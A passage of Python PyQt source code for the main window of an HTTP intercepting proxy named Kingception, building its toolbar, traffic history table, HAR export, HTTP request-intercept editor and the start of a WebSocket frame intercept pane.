        T = _ThemeDark() if _DARK_MODE else _ThemeLight()
        CSS = _make_css()

    def _build_ui(self):
        self._build_toolbar()
        outer = QSplitter(Qt.Orientation.Horizontal)
        self.setCentralWidget(outer)
        outer.addWidget(self._host_sidebar())
        self.tabs = QTabWidget()
        self.tabs.setDocumentMode(True)
        outer.addWidget(self.tabs)
        outer.setSizes([200, 1500])

        # ── Core tabs (eager) — Proxy replaced by Traffic ──────────────────
        self.tabs.addTab(self._traffic_tab(),   "📡 Traffic")      # 0 – replaces old Proxy
        self.tabs.addTab(self._intercept_tab(), "✋ Intercept")    # 1
        self.tabs.addTab(self._repeater_tab(),  "🔁 Repeater")     # 2
        self.tabs.addTab(self._intruder_tab(),  "🎯 Intruder")     # 3
        self.tabs.addTab(self._scanner_tab(),   "🔍 Scanner")      # 4
        self.tabs.addTab(self._decoder_tab(),   "🔤 Decoder")      # 5
        self.tabs.addTab(self._settings_tab(),  "⚙ Settings")     # 6

        # ── Lazy tabs ──────────────────────────────────────────────────────
        self._lazy_tabs = {
            7:  ("📊 Analysis",      self._analysis_tab),
            8:  ("📜 Logger",        self._logger_tab),
            9:  ("🤖 AI Analyzer",   self._ai_analyzer_tab),
            10: ("🤝 Collaborator",  self._collaborator_tab),
            11: ("🧩 Extensions",    self._extensions_tab),
            12: ("🎲 Sequencer",     self._sequencer_tab),
            13: ("⚖ Comparer",      self._comparer_tab),
        }
        self._TAB_ANALYSIS     = 7
        self._TAB_LOGGER       = 8
        self._TAB_AI           = 9
        self._TAB_COLLABORATOR = 10
        self._TAB_EXTENSIONS   = 11
        self._TAB_SEQUENCER    = 12
        self._TAB_COMPARER     = 13
        self._lazy_tab_pending = set(self._lazy_tabs.keys())
        for _li, (_ll, _) in self._lazy_tabs.items():
            self.tabs.addTab(QWidget(), _ll)

        self.tabs.currentChanged.connect(self._lazy_load_tab)
        self._build_statusbar()

    def _lazy_load_tab(self, idx):
        """Build and swap in the real widget for a lazily-registered tab the
        first time it's needed — either the user clicked it (this method is
        wired to tabs.currentChanged) or another part of the app jumped to
        it directly, e.g. Repeater's 'Send to Sequencer' action calls this
        before switching tabs, so the fields it's about to fill in exist."""
        if idx in self._lazy_tab_pending and idx in self._lazy_tabs:
            self._lazy_tab_pending.discard(idx)
            label, builder = self._lazy_tabs.pop(idx)
            real = builder()
            self.tabs.removeTab(idx)
            self.tabs.insertTab(idx, real, label)
            self.tabs.setCurrentIndex(idx)

    def _build_toolbar(self):
        tb = QToolBar("Main", self)
        tb.setMovable(False)
        tb.setFixedHeight(44)
        tb.setStyleSheet(f"QToolBar{{background:{T.PANEL};border-bottom:1px solid {T.BORDER};"
                         f"padding:4px 12px;spacing:6px;}}")
        self.addToolBar(tb)
        self.main_toolbar = tb   # kept so a theme-toggle rebuild can remove it cleanly

        # ── Brand mark ───────────────────────────────────────────────────
        logo_lbl = QLabel()
        logo_lbl.setPixmap(_draw_logo_pixmap(28))
        logo_lbl.setFixedSize(28, 28)
        brand_lbl = QLabel("Kingception")
        brand_lbl.setStyleSheet(
            f"color:{T.TXT1};font-size:14px;font-weight:700;padding-left:2px;")
        tb.addWidget(logo_lbl)
        tb.addWidget(brand_lbl)
        tb.addSeparator()

        self.search_box = QLineEdit()
        self.search_box.setPlaceholderText("Search history…")
        self.search_box.setFixedWidth(220)
        self.search_box.setFixedHeight(30)

        self.f_method = QComboBox()
        self.f_method.addItems(["All", "GET", "POST", "PUT", "DELETE", "PATCH", "HEAD"])
        self.f_method.setFixedWidth(82)

        self.f_status = QComboBox()
        self.f_status.addItems(["All", "2xx", "3xx", "4xx", "5xx"])
        self.f_status.setFixedWidth(64)

        self.clear_btn  = self._btn("Clear", h=30)
        self.export_btn = self._btn("Export", h=30)
        self.theme_btn  = QPushButton("Light" if _DARK_MODE else "Dark")
        self.theme_btn.setFixedHeight(30); self.theme_btn.setFixedWidth(52)
        self.theme_btn.setToolTip("Toggle dark/light theme")
        self.theme_btn.clicked.connect(self._toggle_theme)
        about_btn = self._btn("ℹ", h=30, w=30)
        about_btn.setToolTip("About Kingception")
        about_btn.clicked.connect(self._show_about_dialog)

        for w in [self.search_box, self.f_method, self.f_status, None,
                  self.clear_btn, self.export_btn, None, self.theme_btn, about_btn]:
            if w is None: tb.addSeparator()
            else: tb.addWidget(w)

    def _build_statusbar(self):
        sb = QStatusBar(self)
        self.setStatusBar(sb)
        self.s_status = QLabel("● Starting proxy…")
        self.s_reqs = QLabel("0 reqs")
        self.s_rps = QLabel("0 r/s")
        self.s_bytes = QLabel("↑0 B ↓0 B")
        self.s_hosts = QLabel("0 hosts")
        self.s_pending = QLabel("")
        for lbl in [self.s_status, self.s_reqs, self.s_rps, self.s_bytes, self.s_hosts, self.s_pending]:
            sb.addPermanentWidget(lbl)
            lbl.setStyleSheet(f"color: {T.TXT2}; padding: 0 10px; font-size: 11px")
        # self.proxy is a persistent backend object built once in __init__ and
        # never recreated (see _connect_backend_signals docstring) — so on a
        # theme-toggle rebuild it already reflects the real, current state,
        # and the label should show that immediately rather than resetting.
        if getattr(self, "proxy", None) is not None and self.proxy.is_running:
            self._set_proxy_status("Proxy running on 127.0.0.1:8080", T.GREEN)

    def _host_sidebar(self):
        w = QWidget()
        v = QVBoxLayout(w)
        v.setContentsMargins(4, 4, 4, 4)
        lbl = QLabel("HOSTS")
        lbl.setStyleSheet(f"color: {T.TXT3}; font-size: 10px; font-weight: 700; letter-spacing: 1.5px; padding: 4px")
        v.addWidget(lbl)
        self.host_list = QListWidget()
        self.host_list.setStyleSheet("QListWidget { font-size: 12px; }")
        v.addWidget(self.host_list)
        ref_btn = self._btn("↻ Refresh", h=26)
        ref_btn.clicked.connect(self._refresh_host_list)
        v.addWidget(ref_btn)
        self.host_list.itemClicked.connect(lambda item: (
            setattr(self, '_host_filter', item.data(Qt.ItemDataRole.UserRole)),
            self._filter_proxy_tree()
        ))
        return w

    def _refresh_host_list(self):
        self.host_list.clear()
        item0 = QListWidgetItem("All hosts")
        item0.setForeground(QBrush(QColor(T.BLUE)))
        item0.setData(Qt.ItemDataRole.UserRole, None)
        self.host_list.addItem(item0)
        for host, cnt in self.db.hosts():
            item = QListWidgetItem(f"{host}  ({cnt})")
            item.setData(Qt.ItemDataRole.UserRole, host)
            self.host_list.addItem(item)

    # ---------- Proxy Tab ----------
    def _traffic_tab(self):
        """Live HTTP history — modern replacement for the old Proxy tab."""
        w = QWidget()
        v = QVBoxLayout(w)
        v.setContentsMargins(0, 0, 0, 0)
        v.setSpacing(0)

        # ── Top filter bar ───────────────────────────────────────────────────
        bar = QWidget(); bar.setFixedHeight(38)
        bar.setStyleSheet(f"background:{T.PANEL};border-bottom:1px solid {T.BORDER};")
        bl = QHBoxLayout(bar); bl.setContentsMargins(10,0,10,0); bl.setSpacing(6)

        self.autoscroll_row, self.autoscroll_chk = labeled_toggle("Auto-scroll", checked=True)
        self.autoscroll_chk.toggled.connect(lambda on: setattr(self,'_autoscroll',on))

        _tf_search = QLineEdit(); _tf_search.setFixedHeight(26)
        _tf_search.setPlaceholderText("Search host, path, status…")
        _tf_search.setFixedWidth(220)

        _mf = QComboBox(); _mf.setFixedHeight(26); _mf.setFixedWidth(76)
        _mf.addItems(["All","GET","POST","PUT","DELETE","PATCH","HEAD"])
        _sf = QComboBox(); _sf.setFixedHeight(26); _sf.setFixedWidth(60)
        _sf.addItems(["All","2xx","3xx","4xx","5xx"])

        _clr = QPushButton("Clear"); _clr.setFixedHeight(26)
        _clr.clicked.connect(lambda: self.proxy_tree.clear())
        _exp = QPushButton("Export HAR"); _exp.setFixedHeight(26)
        _exp.clicked.connect(self._export_har)

        _openbr = QPushButton("🌐  Open browser"); _openbr.setFixedHeight(26)
        _openbr.setStyleSheet(primary_btn_css())
        _openbr.setToolTip(
            "Launch a proxied browser. All traffic is captured to HTTP history\n"
            "as you browse — no need to switch Intercept on.")
        _openbr.clicked.connect(lambda: self._open_proxied_browser())

        _cnt = QLabel("0 requests")
        _cnt.setStyleSheet(f"color:{T.TXT3};font-size:11px;font-family:{T.MONO};")
        self._traffic_count_lbl = _cnt

        bl.addWidget(self.autoscroll_row)
        bl.addSpacing(8)
        bl.addWidget(QLabel("Search:")); bl.addWidget(_tf_search)
        bl.addWidget(QLabel("Method:")); bl.addWidget(_mf)
        bl.addWidget(QLabel("Status:")); bl.addWidget(_sf)
        bl.addSpacing(8)
        bl.addWidget(_clr); bl.addWidget(_exp); bl.addWidget(_openbr)
        bl.addStretch(); bl.addWidget(_cnt)
        v.addWidget(bar)

        # ── Main vertical splitter ───────────────────────────────────────────
        sp = QSplitter(Qt.Orientation.Vertical)
        sp.setHandleWidth(2)

        # History tree
        self.proxy_tree = QTreeWidget()
        self.proxy_tree.setHeaderLabels(["#","Method","Host","Path","Status","Size","Time","Content-Type"])
        self.proxy_tree.setAlternatingRowColors(True)
        self.proxy_tree.setSelectionMode(QAbstractItemView.SelectionMode.SingleSelection)
        self.proxy_tree.setContextMenuPolicy(Qt.ContextMenuPolicy.CustomContextMenu)
        self.proxy_tree.setRootIsDecorated(False)
        self.proxy_tree.setUniformRowHeights(True)
        self.proxy_tree.setSortingEnabled(True)
        self.proxy_tree.setStyleSheet(
            f"QTreeWidget{{background:{T.PANEL};border:none;border-radius:0;"
            f"alternate-background-color:{T.SURFACE};}}"
            f"QTreeWidget::item{{padding:4px 8px;border-bottom:1px solid {T.BORDER}18;}}"
            f"QTreeWidget::item:selected{{background:{T.BLUE}22;color:{T.TXT1};}}")
        for i,w2 in enumerate([40,68,170,380,60,70,60,120]):
            self.proxy_tree.setColumnWidth(i, w2)
        sp.addWidget(self.proxy_tree)

        # Request / Response viewer
        bottom = QSplitter(Qt.Orientation.Horizontal)
        bottom.setHandleWidth(2)
        for title, attr in [("Request","req_view"),("Response","resp_view")]:
            c = QWidget(); cv = QVBoxLayout(c); cv.setContentsMargins(0,0,0,0)
            hdr = QWidget(); hdr.setFixedHeight(24)
            hdr.setStyleSheet(f"background:{T.PANEL};border-top:1px solid {T.BORDER};"
                              f"border-bottom:1px solid {T.BORDER};")
            hl = QHBoxLayout(hdr); hl.setContentsMargins(10,0,8,0)
            lbl2 = QLabel(title.upper())
            lbl2.setStyleSheet(f"color:{T.TXT3};font-size:9px;font-weight:700;letter-spacing:2px;")
            hl.addWidget(lbl2); hl.addStretch()
            pe = QPlainTextEdit(); pe.setReadOnly(True); pe.setFont(mono_font(10))
            pe.setLineWrapMode(QPlainTextEdit.LineWrapMode.NoWrap)
            pe.setStyleSheet(f"background:{T.BG};color:{T.CODE};border:none;padding:8px;font-family:{T.MONO};")
            HTTPHighlighter(pe.document())
            setattr(self, attr, pe)
            cv.addWidget(hdr); cv.addWidget(pe)
            bottom.addWidget(c)

        sp.addWidget(bottom)
        sp.setSizes([520, 300])
        v.addWidget(sp, 1)

        # ── Wire tree selection and context menu ─────────────────────────────
        self.proxy_tree.currentItemChanged.connect(
            lambda cur, prev: self._on_tree_click(cur, 0) if cur else None)
        self.proxy_tree.customContextMenuRequested.connect(self._proxy_ctx)

        # ── Filter connections ───────────────────────────────────────────────
        def _apply_filter():
            term  = _tf_search.text().lower()
            mf    = _mf.currentText()
            sf    = _sf.currentText()
            count = 0
            for i2 in range(self.proxy_tree.topLevelItemCount()):
                it = self.proxy_tree.topLevelItem(i2)
                m2  = it.text(1)
                st  = it.text(4)
                txt = (it.text(2) + it.text(3)).lower()
                show = True
                if term and term not in txt: show = False
                if mf != "All" and m2 != mf: show = False
                if sf != "All" and not st.startswith(sf[0]): show = False
                it.setHidden(not show)
                if show: count += 1
            _cnt.setText(f"{count} requests")

        _tf_search.textChanged.connect(_apply_filter)
        _mf.currentTextChanged.connect(_apply_filter)
        _sf.currentTextChanged.connect(_apply_filter)

        return w

    def _export_har(self):
        """Export captured traffic as HAR (HTTP Archive) JSON."""
        import json as _json
        from datetime import datetime
        msgs = list(self.db.recent)
        if not msgs:
            QMessageBox.information(self,"Export HAR","No traffic captured yet.")
            return
        har = {
            "log": {
                "version": "1.2",
                "creator": {"name": "Kingception", "version": "6.0"},
                "entries": []
            }
        }
        for m in msgs:
            rh = m.get('req_headers', {}) or {}
            entry = {
                "startedDateTime": datetime.utcfromtimestamp(m.get('ts', 0)).isoformat() + "Z",
                "time": round((m.get('dur', 0)) * 1000, 2),
                "request": {
                    "method": m.get('method', 'GET'),
                    "url": m.get('url', ''),
                    "httpVersion": "HTTP/1.1",
                    "headers": [{"name": k, "value": v} for k, v in rh.items()],
                    "queryString": [],
                    "bodySize": len(m.get('req_body') or b''),
                    "postData": {"mimeType": rh.get('Content-Type', ''),
                                 "text": decode_body(m.get('req_body'))} if m.get('req_body') else None
                },
                "response": {
                    "status": m.get('status', 0),
                    "statusText": "",
                    "httpVersion": "HTTP/1.1",
                    "headers": [{"name": k, "value": v} for k, v in (m.get('resp_headers') or {}).items()],
                    "content": {
                        "size": m.get('resp_size', 0),
                        "mimeType": m.get('content_type', ''),
                        "text": decode_body(m.get('resp_body'))
                    },
                    "bodySize": m.get('resp_size', 0),
                    "redirectURL": ""
                },
                "cache": {},
                "timings": {"send": 0, "wait": round((m.get('dur', 0)) * 1000, 2), "receive": 0}
            }
            har["log"]["entries"].append(entry)
        path, _ = QFileDialog.getSaveFileName(self, "Export HAR", "kingception_traffic.har",
                                               "HAR files (*.har);;JSON (*.json)")
        if path:
            with open(path, 'w', encoding='utf-8') as f:
                _json.dump(har, f, indent=2, ensure_ascii=False)
            self._log(f"Exported {len(msgs)} requests to {path}")

    def _intercept_tab(self):
        """Intercept tab — two sub-tabs: HTTP (existing) and WebSocket."""
        outer = QWidget()
        outer_l = QVBoxLayout(outer)
        outer_l.setContentsMargins(0,0,0,0); outer_l.setSpacing(0)

        ic_outer_tabs = QTabWidget()
        ic_outer_tabs.setStyleSheet(
            f"QTabWidget::pane{{border:none;background:{T.BG};}}"
            f"QTabBar::tab{{padding:7px 24px;font-size:12px;font-weight:600;"
            f"background:{T.PANEL};color:{T.TXT3};"
            f"border-bottom:2px solid transparent;}}"
            f"QTabBar::tab:selected{{color:{T.BLUE};"
            f"border-bottom:2px solid {T.BLUE};background:{T.BG};}}"
            f"QTabBar::tab:hover:!selected{{background:{T.SURFACE};}}")
        outer_l.addWidget(ic_outer_tabs)

        # ── HTTP intercept pane (the existing implementation) ────────────
        ic_outer_tabs.addTab(self._ic_http_pane(), "🌐 HTTP")

        # ── WebSocket pane ───────────────────────────────────────────────
        ic_outer_tabs.addTab(self._ic_ws_pane(), "⚡ WebSocket")

        return outer

    def _ic_http_pane(self):
        """HTTP intercept pane: URL queue + request editor."""
        w = QWidget()
        root = QVBoxLayout(w)
        root.setContentsMargins(0, 0, 0, 0)
        root.setSpacing(0)

        # ── TOP TOOLBAR ─────────────────────────────────────────────────────
        top = QWidget(); top.setFixedHeight(44)
        top.setStyleSheet(f"background:{T.PANEL};border-bottom:1px solid {T.BORDER};")
        tl = QHBoxLayout(top); tl.setContentsMargins(10,0,10,0); tl.setSpacing(6)

        self.ic_btn = ToggleSwitch(checked=False)
        self.ic_btn.setToolTip("Intercept — hold traffic for manual review/edit before forwarding")
        self.ic_btn_label = QLabel("Intercept OFF")
        self.ic_btn_label.setStyleSheet(f"color:{T.TXT2};font-size:12px;font-weight:700;")

        self.ic_fwd      = QPushButton("Forward");     self.ic_fwd.setObjectName("success")
        self.ic_drop     = QPushButton("Drop");        self.ic_drop.setObjectName("danger")
        self.ic_fwd_all  = QPushButton("Forward All"); self.ic_fwd_all.setObjectName("success")
        self.ic_drop_all = QPushButton("Drop All");    self.ic_drop_all.setObjectName("danger")
        for _b in [self.ic_fwd,self.ic_drop,self.ic_fwd_all,self.ic_drop_all]:
            _b.setFixedHeight(30); _b.setEnabled(False)

        self.ic_action_btn = QPushButton("Action ▾")
        self.ic_action_btn.setFixedHeight(30); self.ic_action_btn.setEnabled(False)

        self.ic_resp_row, self.ic_resp_chk = labeled_toggle("Intercept responses")

        self.ic_req_filter = QLineEdit()
        self.ic_req_filter.setPlaceholderText("URL filter (regex)…")
        self.ic_req_filter.setFixedWidth(220); self.ic_req_filter.setFixedHeight(28)

        tl.addWidget(self.ic_btn)
        tl.addWidget(self.ic_btn_label)
        tl.addSpacing(4)
        for _b2 in [self.ic_fwd, self.ic_drop, self.ic_fwd_all, self.ic_drop_all, self.ic_action_btn]:
            tl.addWidget(_b2)
        tl.addStretch()
        tl.addWidget(self.ic_resp_row)
        tl.addSpacing(12)
        tl.addWidget(QLabel("Filter:")); tl.addWidget(self.ic_req_filter)
        root.addWidget(top)

        # ── STATUS BANNER ────────────────────────────────────────────────────
        self.ic_banner = QLabel("  Intercept is OFF")
        self.ic_banner.setFixedHeight(24)
        self.ic_banner.setStyleSheet(
            f"background:{T.SURFACE};color:{T.TXT3};"
            f"font-size:11px;padding:0 12px;border-bottom:1px solid {T.BORDER};")
        root.addWidget(self.ic_banner)

        # ── MAIN SPLITTER: URL queue (top) | request editor (bottom) ─────────
        splitter = QSplitter(Qt.Orientation.Vertical)
        splitter.setHandleWidth(3)
        splitter.setStyleSheet(
            f"QSplitter::handle{{background:{T.BORDER};}}"
            f"QSplitter::handle:hover{{background:{T.BLUE};}}")

        # ── UPPER PANE: intercepted URL queue ─────────────────────────────────
        self.ic_queue_tbl = QTableWidget(0, 5)
        self.ic_queue_tbl.setHorizontalHeaderLabels(
            ["  Method", "Host", "Path", "Body", "Content-Type"])
        hdr = self.ic_queue_tbl.horizontalHeader()
        hdr.setStretchLastSection(True)
        hdr.resizeSection(0, 80); hdr.resizeSection(1, 180)
        hdr.resizeSection(2, 260); hdr.resizeSection(3, 60)
        self.ic_queue_tbl.setSelectionBehavior(
            QTableWidget.SelectionBehavior.SelectRows)
        self.ic_queue_tbl.setSelectionMode(
            QTableWidget.SelectionMode.SingleSelection)
        self.ic_queue_tbl.setAlternatingRowColors(True)
        self.ic_queue_tbl.setEditTriggers(
            QTableWidget.EditTrigger.NoEditTriggers)
        self.ic_queue_tbl.verticalHeader().setVisible(False)
        self.ic_queue_tbl.setShowGrid(False)
        self.ic_queue_tbl.setStyleSheet(
            f"QTableWidget{{background:{T.PANEL};border:none;border-radius:0;"
            f"gridline-color:{T.BORDER};selection-background-color:{T.BLUE}22;}}"
            f"QTableWidget::item{{padding:5px 10px;border-bottom:1px solid {T.BORDER}22;}}")
        self.ic_queue_tbl.itemSelectionChanged.connect(self._ic_queue_row_changed)
        splitter.addWidget(self.ic_queue_tbl)

        # ── LOWER PANE: request editor panel ─────────────────────────────────
        ed_panel = QWidget()
        ed_vl = QVBoxLayout(ed_panel); ed_vl.setContentsMargins(0,0,0,0); ed_vl.setSpacing(0)

        # Editor toolbar
        ed_tb = QWidget(); ed_tb.setFixedHeight(28)
        ed_tb.setStyleSheet(f"background:{T.PANEL};border-top:1px solid {T.BORDER};"
                            f"border-bottom:1px solid {T.BORDER};")
        etbl = QHBoxLayout(ed_tb); etbl.setContentsMargins(8,0,8,0); etbl.setSpacing(4)

        _rl = QLabel("REQUEST")
        _rl.setStyleSheet(f"color:{T.TXT3};font-size:10px;font-weight:700;letter-spacing:2px;")
        etbl.addWidget(_rl); etbl.addStretch()

        def _etb(lbl, tip):
            b = QPushButton(lbl); b.setFixedHeight(20); b.setToolTip(tip)
            b.setStyleSheet(f"background:{T.SURFACE};color:{T.TXT2};"
                            f"border:1px solid {T.BORDER};border-radius:4px;"
                            f"font-size:10px;padding:0 8px;"); return b

        self.ic_chg_method_btn = _etb("Method",    "Change HTTP method")
        self.ic_add_hdr_btn    = _etb("+ Header",  "Add a header")
        self.ic_del_hdr_btn    = _etb("− Header",  "Remove a header")
        self.ic_nl_btn         = _etb("New Line",  "Insert \r\n at cursor")
        self.ic_beautify_btn   = _etb("Beautify",  "Pretty-print JSON/XML body")
        self.ic_cl_live        = QLabel("0 B")
        self.ic_cl_live.setStyleSheet(f"color:{T.CYAN};font-size:10px;font-family:{T.MONO};")
        self.ic_queue_lbl      = QLabel("0 queued")
        self.ic_queue_lbl.setStyleSheet(f"color:{T.TXT3};font-size:10px;font-family:{T.MONO};")

        for _bx in [self.ic_chg_method_btn, self.ic_add_hdr_btn,
                    self.ic_del_hdr_btn, self.ic_nl_btn, self.ic_beautify_btn]:
            etbl.addWidget(_bx)
        etbl.addSpacing(12)
        etbl.addWidget(self.ic_cl_live)
        etbl.addSpacing(12)
        etbl.addWidget(self.ic_queue_lbl)
        ed_vl.addWidget(ed_tb)

        # Sub-tabs: Raw | Headers | Body | Pretty | Hex
        self.ic_view_tabs = QTabWidget()
        self.ic_view_tabs.setStyleSheet(
            f"QTabWidget::pane{{border:none;background:{T.BG};}}"
            f"QTabBar::tab{{padding:4px 14px;font-size:11px;background:{T.PANEL};"
            f"color:{T.TXT3};border-bottom:2px solid transparent;}}"
            f"QTabBar::tab:selected{{color:{T.BLUE};border-bottom:2px solid {T.BLUE};}}"
            f"QTabBar::tab:hover:!selected{{background:{T.SURFACE};}}")
        self.ic_view_tabs.currentChanged.connect(self._ic_tab_changed)
        self._ic_prev_tab = 0

        self.ic_editor = QPlainTextEdit()
        self.ic_editor.setFont(mono_font(11))
        self.ic_editor.setLineWrapMode(QPlainTextEdit.LineWrapMode.NoWrap)
        self.ic_editor.setStyleSheet(
            f"background:{T.BG};color:{T.CODE};border:none;"
            f"padding:10px;font-family:{T.MONO};font-size:11px;")
        self.ic_editor.setPlaceholderText(
            "Intercepted requests appear here.\n\n"
            "Turn on Intercept, browse to a site, "
            "click a URL above to edit its request.")
        HTTPHighlighter(self.ic_editor.document())
        self.ic_editor.setContextMenuPolicy(Qt.ContextMenuPolicy.CustomContextMenu)
        self.ic_editor.customContextMenuRequested.connect(self._ic_editor_ctx)
        self.ic_editor.textChanged.connect(self._ic_raw_changed)

        self.ic_headers_tbl = QTableWidget(0, 2)
        self.ic_headers_tbl.setHorizontalHeaderLabels(["Header","Value"])
        self.ic_headers_tbl.horizontalHeader().setStretchLastSection(True)
        self.ic_headers_tbl.setAlternatingRowColors(True)
        self.ic_headers_tbl.cellChanged.connect(self._ic_headers_tbl_changed)

        self.ic_body_edit = QPlainTextEdit()
        self.ic_body_edit.setFont(mono_font(11))
        self.ic_body_edit.setPlaceholderText("Request body (editable)…")
        self.ic_body_edit.textChanged.connect(self._ic_body_changed)

        self.ic_pretty = QPlainTextEdit()
        self.ic_pretty.setReadOnly(True); self.ic_pretty.setFont(mono_font(10))

        self.ic_hex_view = QPlainTextEdit()
        self.ic_hex_view.setReadOnly(True); self.ic_hex_view.setFont(mono_font(9))

        self.ic_view_tabs.addTab(self.ic_editor,     "Raw")
        self.ic_view_tabs.addTab(self.ic_headers_tbl,"Headers")
        self.ic_view_tabs.addTab(self.ic_body_edit,  "Body")
        self.ic_view_tabs.addTab(self.ic_pretty,     "Pretty")
        self.ic_view_tabs.addTab(self.ic_hex_view,   "Hex")

        ed_vl.addWidget(self.ic_view_tabs, 1)
        splitter.addWidget(ed_panel)
        splitter.setSizes([220, 400])
        root.addWidget(splitter, 1)

        # ── Queue data: mid → PendingItem ────────────────────────────────────
        self._ic_queue: dict = {}   # mid → pi

        # ── Wire buttons ─────────────────────────────────────────────────────
        self.ic_chg_method_btn.clicked.connect(self._ic_insp_change_method)
        self.ic_add_hdr_btn.clicked.connect(self._ic_insp_hdr_add)
        self.ic_del_hdr_btn.clicked.connect(self._ic_insp_hdr_del)
        self.ic_nl_btn.clicked.connect(self._ic_insert_newline)
        self.ic_beautify_btn.clicked.connect(self._ic_beautify_body)
        self.ic_fwd_all.clicked.connect(self._ic_forward_all)
        self.ic_drop_all.clicked.connect(self._ic_drop_all)
        self.ic_action_btn.clicked.connect(self._ic_show_action_menu)
        self.ic_req_filter.textChanged.connect(
            lambda txt: setattr(self.proxy, '_intercept_url_filter', txt.strip()))

        return w

    def _ic_ws_pane(self):
        """WebSocket intercept / monitor pane.

        Shows live WebSocket frames captured by the proxy, lets you inspect,
        forward, drop, or inject frames, and keeps a full session history.
        """
        w = QWidget()
        root = QVBoxLayout(w); root.setContentsMargins(0,0,0,0); root.setSpacing(0)

        # ── Toolbar ──────────────────────────────────────────────────────
        tb = QWidget(); tb.setFixedHeight(40)
        tb.setStyleSheet(f"background:{T.PANEL};border-bottom:1px solid {T.BORDER};")
        tl = QHBoxLayout(tb); tl.setContentsMargins(10,0,10,0); tl.setSpacing(6)

        self.ws_intercept_btn = QPushButton("WS Intercept OFF")
        self.ws_intercept_btn.setCheckable(True); self.ws_intercept_btn.setFixedHeight(28)
        self.ws_intercept_btn.setFixedWidth(148)
        self.ws_intercept_btn.setStyleSheet(
            f"QPushButton{{background:{T.SURFACE};color:{T.TXT2};"
            f"border:1px solid {T.BORDER};border-radius:6px;"
            f"font-size:11px;font-weight:700;}}"
            f"QPushButton:checked{{background:{T.BLUE}18;color:{T.BLUE};"
            f"border:1px solid {T.BLUE}66;}}")

        self.ws_fwd_btn  = QPushButton("Forward Frame")
        self.ws_drop_btn = QPushButton("Drop Frame")
        self.ws_fwd_btn.setObjectName("success");  self.ws_fwd_btn.setFixedHeight(28)
        self.ws_drop_btn.setObjectName("danger");  self.ws_drop_btn.setFixedHeight(28)
        self.ws_fwd_btn.setEnabled(False); self.ws_drop_btn.setEnabled(False)

        ws_clr_btn = QPushButton("🗑 Clear")
        ws_clr_btn.setFixedHeight(28)
        ws_clr_btn.setStyleSheet(
            f"background:{T.SURFACE};color:{T.TXT2};"
            f"border:1px solid {T.BORDER};border-radius:6px;font-size:11px;")

        ws_export_btn = QPushButton("📄 Export")
        ws_export_btn.setFixedHeight(28)
        ws_export_btn.setStyleSheet(
            f"background:{T.SURFACE};color:{T.TXT2};"
            f"border:1px solid {T.BORDER};border-radius:6px;font-size:11px;")

        self.ws_session_filter = QLineEdit()
        self.ws_session_filter.setPlaceholderText("Filter by URL or payload…")
        self.ws_session_filter.setFixedHeight(26); self.ws_session_filter.setFixedWidth(220)

        self.ws_status_lbl = QLabel("No WS connections captured")
        self.ws_status_lbl.setStyleSheet(f"color:{T.TXT3};font-size:11px;font-family:{T.MONO};")

        tl.addWidget(self.ws_intercept_btn)
        tl.addSpacing(4)
        tl.addWidget(self.ws_fwd_btn); tl.addWidget(self.ws_drop_btn)
        tl.addWidget(ws_clr_btn); tl.addWidget(ws_export_btn)
        tl.addStretch()
        tl.addWidget(QLabel("Filter:")); tl.addWidget(self.ws_session_filter)
        tl.addSpacing(12); tl.addWidget(self.ws_status_lbl)
        root.addWidget(tb)

        # ── Direction legend bar ─────────────────────────────────────────
        leg = QWidget(); leg.setFixedHeight(22)
        leg.setStyleSheet(f"background:{T.SURFACE};border-bottom:1px solid {T.BORDER};")
        ll = QHBoxLayout(leg); ll.setContentsMargins(12,0,12,0); ll.setSpacing(16)
        for sym, lbl, col in [("▶","Client → Server (outgoing)",T.GREEN),
                               ("◀","Server → Client (incoming)",T.BLUE),
                               ("🔴","Dropped",T.RED)]:
            ql = QLabel(f'<span style="color:{col};font-weight:700">{sym}</span>'
                        f'&nbsp;<span style="color:{T.TXT3};font-size:10px">{lbl}</span>')
            ql.setTextFormat(Qt.TextFormat.RichText); ll.addWidget(ql)
        ll.addStretch()
        root.addWidget(leg)

        # ── Main split: session list | frame detail ───────────────────────
        sp = QSplitter(Qt.Orientation.Vertical); sp.setHandleWidth(3)

        # Upper: frames table
        self.ws_tbl = QTableWidget(0, 6)
        self.ws_tbl.setHorizontalHeaderLabels(
            ["Dir","Time","URL","Length","Opcode","Payload Preview"])
        hh = self.ws_tbl.horizontalHeader()
        hh.setSectionResizeMode(5, hh.ResizeMode.Stretch)
        for i, w2 in enumerate([36, 88, 200, 70, 70, 0]):
            if w2: self.ws_tbl.setColumnWidth(i, w2)
        self.ws_tbl.setAlternatingRowColors(True)
        self.ws_tbl.setEditTriggers(QAbstractItemView.EditTrigger.NoEditTriggers)
        self.ws_tbl.setSelectionBehavior(QAbstractItemView.SelectionBehavior.SelectRows)
        self.ws_tbl.setContextMenuPolicy(Qt.ContextMenuPolicy.CustomContextMenu)
        self.ws_tbl.customContextMenuRequested.connect(self._ws_ctx)
        self.ws_tbl.currentItemChanged.connect(self._ws_frame_selected)
        sp.addWidget(self.ws_tbl)

        # Lower: frame detail + inject
        detail = QWidget()
        dv = QVBoxLayout(detail); dv.setContentsMargins(0,0,0,0); dv.setSpacing(0)

        det_tabs = QTabWidget()
        det_tabs.setStyleSheet(
            f"QTabWidget::pane{{border:none;background:{T.BG};}}"
            f"QTabBar::tab{{padding:4px 14px;font-size:11px;background:{T.PANEL};"
            f"color:{T.TXT3};border-bottom:2px solid transparent;}}"
            f"QTabBar::tab:selected{{color:{T.BLUE};border-bottom:2px solid {T.BLUE};}}")

        # Payload viewer (read-only)
        self.ws_payload_view = QPlainTextEdit()
        self.ws_payload_view.setReadOnly(True); self.ws_payload_view.setFont(mono_font(10))
        self.ws_payload_view.setPlaceholderText("Select a frame above to view its payload…")
        self.ws_payload_view.setStyleSheet(
            f"background:{T.BG};color:{T.CODE};border:none;padding:8px;font-family:{T.MONO};")

        # Hex view
        self.ws_hex_view = QPlainTextEdit()
        self.ws_hex_view.setReadOnly(True); self.ws_hex_view.setFont(mono_font(9))
        self.ws_hex_view.setStyleSheet(
            f"background:{T.BG};color:{T.CODE};border:none;padding:8px;font-family:{T.MONO};")

        # Inject panel (send custom frames)
        inj_w = QWidget()
        iv = QVBoxLayout(inj_w); iv.setContentsMargins(8,8,8,8); iv.setSpacing(6)
        inj_top = QHBoxLayout(); inj_top.setSpacing(6)
        inj_top.addWidget(QLabel("Direction:"))
        self.ws_inj_dir = QComboBox()
        self.ws_inj_dir.addItems(["Client → Server (▶)","Server → Client (◀)"])
        self.ws_inj_dir.setFixedHeight(26)
        inj_top.addWidget(self.ws_inj_dir)
